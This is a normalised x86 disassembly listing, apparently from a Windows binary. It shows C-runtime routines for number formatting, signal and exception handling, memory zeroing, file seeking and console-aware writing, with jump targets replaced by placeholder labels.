cmp [ edi ] 0x2d
sete al
add eax esi
mov [ eax + ebx ] 0x30
add esi eax
push esi
lea ebx [ esi + 0x1 ]
call sub_10018330
inc eax
push eax
push esi
push ebx
call sub_10017050
mov [ esi ] 0x30
add esp 0x10
mov esi ebx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push esi
lea ebx [ esi + 0x1 ]
call sub_10018330
inc eax
push eax
push esi
push ebx
call sub_10017050
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov edi [ edi + 0x4 ]
add esp 0x10
test edi edi
jns r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
neg edi
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] edi
cmp [ ebp + 0xc ] edi
jl r-xdata
mov edi [ ebp + 0xc ]
mov eax ebx
call sub_10022024
push edi
push 0x30
push ebx
call sub_1001b6e0
add esp 0xc
sub_1002272a
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_100255b3
add esp 0x14
test edi edi
jne r-xdata
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
call sub_10017e85
mov [ eax ] esi
call sub_1001b8e4
mov eax esi
jmp r-xdata
or eax 0xffffffff
cmp ebx eax
je r-xdata
call sub_10017e85
mov [ eax ] esi
call sub_1001b8e4
mov eax esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10016ec3
leave
retn
mov esi [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x28 ]
add ecx esi
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
add eax edi
push eax
call sub_1002544d
add esp 0x10
test eax eax
je r-xdata
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
mov eax ebx
sete cl
sub eax ecx
pop ebx
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push 0x0
push esi
push ebx
mov ecx edi
call sub_10022627
add esp 0x10
mov [ edi ] 0x0
jmp r-xdata
sub_100227eb
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x16
pop edi
push edi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_100255b3
add esp 0x14
test esi esi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
call sub_10017e85
mov [ eax ] edi
call sub_1001b8e4
mov eax edi
jmp r-xdata
push ebx
mov ebx [ ebp - 0x28 ]
xor eax eax
dec ebx
cmp [ ebp - 0x2c ] 0x2d
sete al
lea edi [ eax + esi ]
cmp ecx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10016ec3
leave
retn
sub ecx eax
or ecx ecx
jmp r-xdata
mov eax [ ebp - 0x28 ]
dec eax
cmp ebx eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ esi ] 0x0
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
push [ ebp + 0x14 ]
push ecx
push edi
call sub_1002544d
add esp 0x10
test eax eax
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x1
push eax
push [ ebp + 0x18 ]
mov eax esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_10022069
add esp 0x18
cmp eax [ ebp + 0x14 ]
jge r-xdata
pop ebx
test cl cl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x1
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
call sub_10022627
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
mov [ edi - 0x2 ] al
sub_100228d8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100221ca
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002272a
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100222b1
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100227eb
jmp r-xdata
sub_10022960
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100228d8
add esp 0x1c
pop ebp
retn
sub_10022983
mov edi edi
push esi
push edi
xor edi edi
push [ edi + rw-data ]
call [ EncodePointer@IAT ]
mov [ edi + rw-data ] eax
add edi 0x4
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_100229a6
mov edi edi
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_10025758
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call sub_1001b892
sub_100229ce
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_100176e6
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10022a20
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
xor edi edi
push edi
push edi
push edi
push edi
push ecx
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x20 ] ecx
xor ebx ebx
call sub_10026259
add esp 0x20
mov [ ebp - 0x14 ] eax
test al 0x4
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_100257b7
test [ ebp - 0x14 ] 0x2
pop ecx
pop ecx
jne r-xdata
mov ebx 0x200
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
jmp r-xdata
mov ebx 0x80
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov [ esi + 0x14 ] eax
pop edi
mov [ esi ] ebx
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10016ec3
leave
retn
or ebx 0x100
cmp eax 0x2
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
sub_10022ae5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_10022b29
push 0x20
push r--data
call sub_1001de70
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_1001c03b
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_1001deb5
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_10022ae5
pop ecx
lea esi [ eax + 0x8 ]
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_1001d77d
mov [ ebp - 0x1c ] 0x1
push eax
call [ DecodePointer@IAT ]
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_10017e85
mov [ eax ] 0x16
call sub_1001b8e4
jmp r-xdata
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_1001fd54
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_1001bf04
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10022c90
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ r--data ]
add ecx [ r--data ]
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_10022ce0
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_10022d70
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_10024fe5
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_10025004
jmp r-xdata
sub_10022d70
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_10016ec3
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_10022ce0
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_10022dd2
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_10022e02
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10022e32
pxor xmm0 xmm0
push ecx
push ebx
mov eax ecx
and eax 0xf
test eax eax
jne r-xdata
mov ebx eax
neg ebx
add ebx 0x10
sub edx ebx
xor eax eax
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov eax edx
and edx 0x7f
shr eax 0x7
je r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
lea esp [ esp ]
pop edx
jmp r-xdata
mov [ ecx ] eax
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop ebx
pop eax
retn
mov eax edx
shr eax 0x4
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec eax
jne r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov eax edx
xor ebx ebx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec eax
jne r-xdata
and eax 0x3
je r-xdata
mov [ ecx ] ebx
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] bl
inc ecx
dec eax
jne r-xdata
sub_10022eec
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
push edi
push esi
mov [ ebp - 0x4 ] eax
call sub_100269bb
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
mov [ ebp - 0x8 ] eax
cmp eax edi
jne r-xdata
call sub_10017e85
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_10017eab
pop ecx
jmp r-xdata
mov eax edi
mov edx edi
jmp r-xdata
sub_10022f71
push 0x14
push r--data
call sub_1001de70
or ebx 0xffffffff
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_10017e98
and [ eax ] 0x0
call sub_10017e85
mov [ eax ] 0x9
call sub_10017e98
and [ eax ] 0x0
call sub_10017e85
mov [ eax ] 0x9
call sub_1001b8e4
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_1001deb5
retn
mov eax ebx
mov edx ebx
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_10026a24
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_10017e85
mov [ eax ] 0x9
call sub_10017e98
and [ eax ] 0x0
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10022eec
add esp 0x10
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10023051
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x20 ]
sub_1002305b
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_100252a0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] edi
mov [ ebp - 0x1ad0 ] edi
cmp [ ebp + 0x10 ] edi
jne r-xdata
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
sar eax 0x5
mov edi esi
push ebx
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebx ]
and edi 0x1f
shl edi 0x6
mov cl [ eax + edi + 0x24 ]
add cl cl
sar cl 0x1
mov [ ebp - 0x1adc ] ebx
mov [ ebp - 0x1ac1 ] cl
cmp cl 0x2
je r-xdata
call sub_10017e98
mov [ eax ] edi
call sub_10017e85
mov [ eax ] 0x16
call sub_1001b8e4
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10016ec3
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp cl 0x1
jne r-xdata
test [ eax + edi + 0x4 ] 0x20
je r-xdata
call sub_10017e98
and [ eax ] 0x0
call sub_10017e85
mov [ eax ] 0x16
call sub_1001b8e4
jmp r-xdata
push esi
call sub_10023875
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push esi
call sub_10022eec
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ ebx ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop ebx
push ecx
lea ecx [ ebp - 0x1ad8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax + edi ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac1 ] 0x0
mov [ ebp - 0x1abc ] ecx
jne r-xdata
call sub_1001c0b4
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae0 ]
sete cl
push eax
mov eax [ ebx ]
push [ edi + eax ]
mov esi ecx
call [ GetConsoleMode@IAT ]
xor ecx ecx
cmp eax ecx
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
mov eax [ ebp - 0x1ad8 ]
and [ ebp - 0x1abc ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
cmp [ ebp - 0x1ac1 ] 0x2
jne r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x80
je r-xdata
cmp esi ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1abc ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov ebx [ ebp - 0x1acc ]
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
mov ecx ebx
xor esi esi
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae0 ] eax
xor eax eax
mov [ ebp - 0x1ad4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
cmp [ ebp - 0x1ac1 ] cl
je r-xdata
push 0x5
pop esi
cmp [ ebp - 0x1abc ] esi
jne r-xdata
mov ecx [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
and [ ebp - 0x1ac0 ] 0x0
mov ecx ebx
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x1ab8 ]
pop esi
call sub_10017e85
mov [ eax ] 0x1c
call sub_10017e98
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov dl [ ebx ]
inc ebx
inc ecx
mov [ ebp - 0x1ae0 ] ebx
cmp dl 0xa
jne r-xdata
mov [ ebp - 0x1ac0 ] eax
push [ ebp - 0x1abc ]
call sub_10017eab
pop ecx
jmp r-xdata
call sub_10017e85
mov [ eax ] 0x9
call sub_10017e98
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1ad4 ]
movzx edx [ edx ]
add [ ebp - 0x1ad4 ] esi
add ecx esi
cmp edx 0xa
jne r-xdata
mov esi eax
lea eax [ ebp - 0x1ab8 ]
sub esi eax
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
push esi
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx edx [ ebx ]
add ebx esi
add ecx esi
mov [ ebp - 0x1ae0 ] ebx
cmp edx 0xa
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
mov [ eax ] dl
inc eax
inc esi
cmp esi 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc esi
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1adc ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae4 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad8 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax [ ebp - 0x1ad8 ]
add [ ebp - 0x1ac8 ] eax
cmp eax esi
jl r-xdata
add [ ebp - 0x1ac0 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac0 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] esi
push 0xd
pop ebx
mov [ eax ] bx
mov ebx [ ebp - 0x1ae0 ]
add eax esi
add [ ebp - 0x1ac0 ] esi
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
movzx esi [ ebx ]
xor ecx ecx
cmp esi 0xa
sete cl
add ebx 0x2
add [ ebp - 0x1ac0 ] 0x2
mov [ ebp - 0x1abc ] esi
mov [ ebp - 0x1ae4 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_10022a06
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1abc ] eax
add esi [ ebp - 0x1ad8 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax ebx
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
jmp r-xdata
push [ ebp - 0x1abc ]
call sub_10026aea
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1abc ]
push eax
call sub_10026c42
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1ad4 ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1ac0 ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1abc ]
push ecx
push eax
push [ ebp - 0x1ae0 ]
inc ebx
inc [ ebp - 0x1ac0 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1abc ]
push ebx
push eax
call sub_10026c42
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1abc ] eax
call sub_10026aea
pop ecx
cmp ax [ ebp - 0x1abc ]
jne r-xdata
mov al [ ebp - 0x1ac1 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1ac0 ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1ac0 ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
mov [ ebp - 0x1ac8 ] eax
cmp [ ebp - 0x1ad4 ] esi
jl r-xdata
cmp [ ebp - 0x1ae4 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1adc ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ad4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_10023758
push 0x10
push r--data
call sub_1001de70
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_10017e98
and [ eax ] 0x0
call sub_10017e85
mov [ eax ] 0x9
call sub_10017e98
and [ eax ] 0x0
call sub_10017e85
mov [ eax ] 0x9
call sub_1001b8e4
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_1001deb5
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
